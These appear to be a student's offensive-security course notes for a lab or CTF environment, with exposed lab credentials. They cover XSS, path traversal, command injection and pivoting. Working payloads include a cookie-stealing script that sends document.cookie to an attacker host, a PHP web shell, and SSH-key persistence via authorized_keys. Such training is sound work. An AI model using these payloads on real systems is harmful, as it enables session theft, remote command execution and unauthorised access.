# Stack Info
```
--Stack Number
  5

--Username
CODA-503-M

--Password
Gx1LjlSgOgQJJMy

Boxes
Student - Password
--Linux ops
10.50.31.135
 
--Windows
10.50.24.133

--Jump
10.50.27.155

--Password
Gx1LjlSgOgQJJMy

--CTFd
http://10.50.20.30:8000/resources
```
# Day 1 - XSS
## Enumeration
```
    Robots.txt

    Legitimate surfing

    Tools:

        NSE scripts

        Nikto
```
## Reflected XSS
```
    Most common form of XSS

    Transient, occurs in error messages or search results

    Delivered through intermediate media, such as a link in an email

    Characters that are normally illegal in URLs can be Base64 encoded


Below is what you see, but the server will decode as name=abc123


http://example.com/page.php?name=dXNlcjEyMw
```
## Stored XSS
```
    Resides on vulnerable site

    Only requires user to visit page


<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
## Useful JavaScript Components
```
Proof of vulnerability to xss (simple alert):

<script>alert('XSS');</script>

    Capturing Cookies
    document.cookie

    Capturing Keystrokes

        bind keydown and keyup

    Capturing Sensitive Data
    document.body.innerHTML
```
## More Stored XSS 
```
On Box
python3 -m http.server

On Website
<script>document.location="http://x.x.x.x:8000/"+document.cookie;</script>
```
## Server-Side injection
```
Directory Traversal/Path Traversal


    Ability to read/execute outside web server’s directory

    Uses ../../ (relative paths) in manipulating a server-side file path


view_image.php?file=../../etc/passwd
```
## Malicious File Upload
in the near future there may be a time when you can upload a file but it will be uploaded somewhere seperate. ** MUST be able to upload AND call your file
```
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
## Command Injection
```
Application on the server is vulnerable,
allowing execution of arbitrary commands

    User input not validated
        Common example is a SOHO router, with a web page to allow ping

Might contain the following in it’s code:
system("ping -c 1 ".$_GET["ip"]);


Run the following to chain/stack our arbitrary command
; cat /etc/passwd
```

## Upload publickey 
```
ssh keys stored in /etc/ssh
ssh-keygen -t rsa -b 4096
cat .ssh/id_rsa
cat .ssh/id_rsa.pub

; ls -lisa /var/www/
; mkdir /var/www/.ssh
; ls -lisa /var/www/.ssh
; echo "your_public_key_here" >> /var/www/.ssh/authorized_keys

ssh -i .ssh/id_rsa www-data@x.x.x.x
```
# Notes
```
ssh -MS /tmp/jump student@10.50.27.155
  2 ssh -S /tmp/jump dummy -O forward -D 9050
  3 proxychains nmap -T4 10.100.28.40 --script=http-enum
  4 
  5 ssh -S /tmp/jump dummy -O forward -L 1111:10.100.28.40:80
  6 firefox localhost:1111
  7 
  8 uploaded webshell.php
  9 
 10 ssh -S /tmp/jump dummy -O forward -L 4041:10.100.28.40:4444
 11 proxychains ssh -i .ssh/id_rsa billybob@10.100.28.40 -p 4444
 12 
 13 ssh -MS /tmp/t1 billybob@127.0.0.1 -p 4041
 14 ssh -S /tmp/t1 fug -O forward -L 6767:10.100.28.55:22
 15 ssh -S /tmp/t1 fug -O forward -D 9050
 16 firefox localhost:6999
 17 
 18 inspect element on the websit and check functions
 19 call the function in the console
 20 
 21 Directory Traversal, use GET or POST methond
 22 eg., http://localhost:6999/books_pick.php?book=
 23 Use ../../../../etc/passwd
```
